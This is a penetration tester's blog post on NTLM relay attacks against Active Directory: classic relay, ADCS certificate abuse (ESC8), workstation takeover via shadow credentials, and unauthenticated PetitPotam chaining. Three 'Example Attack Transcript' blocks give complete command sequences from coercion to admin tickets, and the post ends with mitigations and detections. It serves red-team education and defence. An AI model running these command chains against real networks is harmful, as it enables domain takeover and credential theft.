# Keeping Up with the NTLM Relay
February 11, 2022
Matthew Creel

Back in when I was getting started as a junior pentester, I vividly remember reading [@byt3bl33d3r](https://twitter.com/byt3bl33d3r)'s 2017 post: [Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes)](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html). I still recommend checking this out if you haven't already - it will cover the basics of NTLM relaying and background on some of the confusing pieces (\[Net\]NTLMv1/2 anyone?) that there's no need for me to repeat here. There's also a plethora of other great NTLM relay blogs and resources that I'll try to link to throughout this post, while I attempt to touch on the ever growing library of NTLM relay uses after 2021 introduced several new relay vectors.

‍

[#1 - The Classic NTLM Relay Attack](#the-classic-ntlm-relay-attack)
[#2 - ADCS Compromise via NTLM Relay](#adcs-compromise-via-ntlm-relay)
[#3 - Workstation Takeover via NTLM Relay](#workstation-takeover-via-ntlm-relay)
[#4 - Substituting Initial Account Compromise with More NTLM Relay](#substituting-initial-account-compromise-with-more-ntlm-relay)

‍

#### The Classic NTLM Relay Attack

This is what has been around for years. Your laptop or NUC is on the internal network and you so you fire up ntlmrelayx with either Responder or Mitm6 and in no time you're relaying hashes around to other workstations and servers over SMB. Here's a quick (simplified) refresher of the attack flow:

<img width="850" height="284" src="../../_resources/620aca09088cd82116d613ff_graphic_6ff4b18493544a989.png"/>

Check out this [post](https://en.hackndo.com/ntlm-relay/) for much more technical detail on the above.

There are some standard variations of this, a good example being cross-protocol relay of HTTP authentication to LDAP for Active Directory enumeration or escalation, a capability offered by `ntlmrelayx`. These attack chains are still entirely more common than we'd hope to see. However, there are more encounters nowadays with networks where precaution has been taken through disabling LLMNR/NBT-NS and/or enabled SMB signing. This can make your relay toolkit harder to use - but not impossible.


#### A Word on Machine Authentication Coercion

An attacker could force a remote machine to authenticate back to an arbitrary IP address. Since then, Lee Christensen ([@tifkin_](https://twitter.com/tifkin)) has published the printerbug (2018), as a part of research related to [forest trusts](https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d), and during the summer of 2021, Gilles Lionel ([@topotam77](https://twitter.com/topotam77)) published PetitPotam. Most recently, Charlie Bromberg ([@_nwodtuhs](https://twitter.com/_nwodtuhs)) published a PoC, ShadowCoerce, which is more targeted at domain controllers.

Each of these take advantage of different Windows RPC functions in a way that open the door for an authenticated attacker to coerce a remote machine to authenticate back to an attacker-controlled host. (Side note: there is an amazing [blog](https://itm4n.github.io/from-rpcview-to-petitpotam/) about searching for these.) Attacks based off these coercion techniques are somewhat comparable to the [PrivExchange](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/) scenario.

The ability to force a machine to authenticate to you, by default over SMB, has spawned some interesting new use cases, described below. You can of course, still try to abuse this captured authentication as you normally would with ntlmrelayx, with the caveat that the captured computer authentication likely requires local admin privileges to your relay target. You can query for this in BloodHound:

‍

```
MATCH p = (m:Computer)-[r1:AdminTo]->(n:Computer) RETURN p UNION ALL MATCH p = (c:Computer)-[r2:MemberOf|HasSIDHistory*1..]->(g:Group)-[r3:AdminTo]->(d:Computer) RETURN p 
```

‍

#### ADCS Compromise via NTLM Relay

As a result of the [Certified Pre-Owned](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) research, the attack dubbed *ESC8* became very popular. This involves relaying coerced machine account authentication to an ADCS (Active Directory Certificate Services) web enrollment service (which accepts NTLM auth, by default) and obtaining a certificate that enables domain authentication as the target. Here's the flow for taking over a workstation or server in this manner:

<img width="850" height="330" src="../../_resources/620aca3c71d4ca5d2d10ebb3_graphic_fccbbe11cea84652a.png"/>

If your target is a domain controller, there's no need for S4U. Once you have a TGT you can just go right to DCSync. That's probably the most well documented variation of this attack, but it's usually possible to target any system in this manner. (Targeting a DC in this attack may not even require a compromised credential for PetitPotam, but we'll come back to that.)

‍

##### Example Attack Transcript

```
# https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
python3 ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template [DomainController|Machine] -smb2support

# https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
python3 printerbug.py domain.local/user:pass@target.domain.local <attacker ip>

# OR
# https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py
python3 PetitPotam.py -u user -p pass -d domain.local <attacker ip> target.domain.local

# Obtain TGT using https://github.com/dirkjanm/PKINITtools
# Use the base64 certificate blob from ntlmrelayx, or decode the base64 to a file and use the -cert-pfx flag
python3 gettgtpkinit.py domain.local/target\$ target.ccache -pfx-base64 <base64 blob>

# Obtain a TGS using S4U2Self to obtain admin rights on the target
python3 gets4uticket.py kerberos+ccache://domain.local\\target\$:target.ccache@dc.domain.local cifs/target.domain.local@domain.local administrator@domain.local administrator.ccache -v 
```

#### Workstation Takeover via NTLM Relay

I won't spend too much time on this scenario since I've posted more in depth about the shadow credentials variation of this attack [here](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition). In short, if you can relay your coerced authentication to a DC over LDAP(S) there are two potential ways you can obtain admin rights to the target: shadow credentials and resource-based constrained delegation (RBCD). A great post describing the RBCD variation can be found [here](https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb).

The trick here is that SMB authentication can't usually be relayed over LDAP due to session signing. A good alternative is coercing auth to a WebDAV backconnect, but this requires the target to have the Web Client service running, generally limiting this attack to workstations. Give the articles I linked to above a read for more details and examples!

Keeping up with the visual breakdown, these two workstation takeover scenarios look like this:

‍

![](../../_resources/620d0790376ddc8566308012_Microso_6047442f46f74b118.png)

‍

##### Example Attack Transcript

```
# https://github.com/ShutdownRepo/impacket/tree/pywhisker
python3 ntlmrelayx.py -t ldap://dc.domain.local --shadow-credentials --shadow-target target\$

# https://github.com/lgandx/Responder
# SMB and HTTP off
# Will poison the name in your UNC path below, if target attempts to resolve over LLMNR/NBT-NS
./Responder.py -I eth0 -w

# https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
python3 printerbug.py domain.local/user:pass@target.domain.local badhost@80/path

# OR
# https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py
python3 PetitPotam.py -u user -p pass -d domain.local badhost@80/path target.domain.local

# Obtain TGT using https://github.com/dirkjanm/PKINITtools
# pfx file and pfx password will be generated by ntlmrelayx
python3 gettgtpkinit.py domain.local/target\$ target.ccache -cert-pfx <pfx file path> -pfx-pass <pfx password>

# Obtain a TGS using S4U2Self to obtain admin rights on the target
python3 gets4uticket.py kerberos+ccache://domain.local\\target\$:target.ccache@dc.domain.local cifs/target.domain.local@domain.local administrator@domain.local administrator.ccache -v 
```

‍

#### Substituting Initial Account Compromise with More NTLM Relay

Why not crank up the difficulty? Up until this point, the authentication coercion + relay scenarios I've covered have been using a previously known/compromised account to kick off the coercion mechanism. These attacks are still potentially viable if you *do not* own a credential due to the fact that domain controllers without an August 2021 patch are vulnerable to unauthenticated PetitPotam. You may know this already, as the big attack vector floating around after PetitPotam's release was unauthenticated DC compromise through relaying to an ADCS web enrollment endpoint. However, the shadow credentials/RBCD attack vector can leverage this too by wrapping in an extra round of relaying.


‍

The overall attack flow looks like this:

‍

![](../../_resources/620d07cd078fc24ed48acc63_Microso_424f88d0110e421a8.png)

‍

##### Example Attack Transcript

```
# https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
# Setup to relay auth from the DC to your target
python3 ntlmrelayx.py -t smb://target.domain.local -smb2support -socks

# https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py
# Target unpatched DC with unauthenticated PetitPotam
python3 PetitPotam.py -u '' -p '' -d '' <attacker ip> dc.domain.local

# Stop the current ntlmrelayx servers to free the ports, but leave the SOCKS proxy running
ntlmrelayx> stopservers

# https://github.com/ShutdownRepo/impacket/tree/pywhisker
# Start a second instance of ntlmrelayx, this time for shadow credential attack
python3 ntlmrelayx.py -t ldap://dc.domain.local --shadow-credentials --shadow-target target\$

# https://github.com/lgandx/Responder
# SMB and HTTP off
# Will poison the name in your UNC path below, if target attempts to resolve over LLMNR/NBT-NS
./Responder.py -I eth0 -w

# https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
# Trigger auth from your target, authenticating through the SOCKS proxy as the vulnerable DC
proxychains python3 printerbug.py DOMAIN/DC\$:fakepass@target.domain.local badhost@80/path

# OR
# https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py
proxychains python3 PetitPotam.py -u DC\$ -p fakepass -d DOMAIN badhost@80/path target.domain.local

# Obtain TGT using https://github.com/dirkjanm/PKINITtools
# pfx file and pfx password will be generated by ntlmrelayx
python3 gettgtpkinit.py domain.local/target\$ target.ccache -cert-pfx <pfx file path> -pfx-pass <pfx password>

# Obtain a TGS using S4U2Self to obtain admin rights on the target
python3 gets4uticket.py kerberos+ccache://domain.local\\target\$:target.ccache@dc.domain.local cifs/target.domain.local@domain.local administrator@domain.local administrator.ccache -v 
```

‍

In a scenario where a DC, which doubled as the domain's sole CA, was missing the unauthenticated PetitPotam patch. Since the DC/CA were the same host, I was unable to trigger PetitPotam and directly enroll in a certificate as the DC. However, by using the unauthenticated PetitPotam + SOCKS proxy trick described above, I was able to enroll in a certificate template as a high-value server without any compromised credentials to start the attack. The more I type this out, the more confusing it sounds so hopefully the visual clears it up:
‍![](../../_resources/620aca90088cd84099d652c1_graphic_09080b0ea5ff4e7fa.png)

‍

#### New NTLM Relay Tooling?

2021 also brought us some new relay tooling, or at least some tools teases that I'm keeping tabs on.

##### lsarelayx

[lsarelayx](https://github.com/CCob/lsarelayx) was released by [@*EthicalChaos*](https://twitter.com/_EthicalChaos_) in November 2021. This requires administrator rights on a Windows machine to use, but allows for system wide NTLM relay through the use of a LSA authentication plugin that gets loaded by LSASS. I still haven't played with lsarelayx myself, but it's on my bucket list.

##### Farmer v2.0?

[Farmer](https://github.com/mdsecactivebreach/Farmer) is a powerful NetNTLM hash havesting tool which has come up clutch for me on at least one engagement. The associated [blog](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/) also has some great information on WebDAV tricks. Dominic Chell teased an unreleased version of Farmer with relay capabilities on [Twitter](https://twitter.com/domchell/status/1432411230334033920) in August 2021.

‍

#### Mitigations and Detections

Short of disabling NTLM authentication across the organization (which would prevent all the relay attacks described in this post, but isn't feasible for everyone), here are some potential mitigation and detection strategies.

- Disable LLMNR and NetBIOS Name Service
- Enforce session signing on SMB and LDAP
- Enforce EPA (Extended Protection for Authentication) on LDAPS and HTTPS
- Disable the ADCS web enrollment endpoint. If this cannot be done, NTLM authentication can be disabled on the host level or service level (IIS) on the certificate authority. Step-by-step instructions can be found in this [post](https://www.truesec.com/hub/blog/mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-adv210003-kb5005413-petitpotam).
- Disable the Web Client service
- Disable the Print Spooler service
- Block or alert on potentially malicious RPC use (i.e. MS-EFSR, MS-RPRN) with [rpcfirewall](https://github.com/zeronetworks/rpcfirewall)
- Monitor for Kerberos TGTs requested (event ID 4768) using PKINIT authentication if the behavior is not standard for the network environment or account.
- Monitor for AD object modifications (event ID 5136 or 4662) where the attribute being modified is `msDS-KeyCredentialLink` or `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- Monitor event ID 4420 from the EFS source
- Monitor for `AllowAllCliAuth` [registry key](https://support.microsoft.com/en-au/topic/kb5009763-efs-security-hardening-changes-in-cve-2021-43217-719fbc9d-ad9b-4f90-a964-0afe40338002) changes

‍

Credit:
Fortified Security
